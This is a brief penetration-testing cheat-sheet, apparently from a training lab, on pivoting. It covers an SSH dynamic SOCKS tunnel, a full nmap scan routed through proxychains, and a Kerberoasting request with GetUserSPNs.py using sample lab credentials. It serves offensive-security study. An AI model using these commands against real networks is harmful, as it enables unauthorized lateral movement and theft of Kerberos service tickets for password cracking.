# Pivot

## Proxy Chains

`cat /etc/proxychains.conf` Note the port mentioned in last line.

We will utilize that port to bind

```
ssh -f -N -D <port above> <user>@<ip>
```

Now we can run any command while pivoting through

Ex-

```
proxychains nmap -p- -sCV <ip>
```

Kerberoasting attack

```
proxychains GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip <ip of machine we want to pivot to> -request
```

